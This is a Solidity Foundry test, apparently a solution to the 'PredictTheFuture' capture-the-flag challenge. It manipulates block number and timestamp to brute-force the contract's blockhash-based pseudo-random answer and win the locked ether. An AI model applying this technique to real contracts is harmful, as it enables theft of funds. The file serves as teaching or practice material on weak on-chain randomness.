// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // we can lock any number
        uint8 predictedAnswer = 1;

        // Lock in the predicted answer with 1 ether
        predictTheFuture.lockInGuess{value: 1 ether}(predictedAnswer);

        // Advance the block number and timestamp to surpass the settlement block number
        // We need to at least wait for 2 blocks after calling ockInGuess to call settle
        // Under proof of stake, the Ethereum block interval is fixed at 12 seconds (or possibly a multiple of 12 seconds, in rare cases).
        vm.roll(104293 + 2); // +2 block
        vm.warp(93582192 + 24); // 12 sec for each block

        // Keep calling the settle function until predictedAnswer match the actual answer
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        while (answer != predictedAnswer) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12); // 12 sec for each block
            answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        }

        predictTheFuture.settle();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
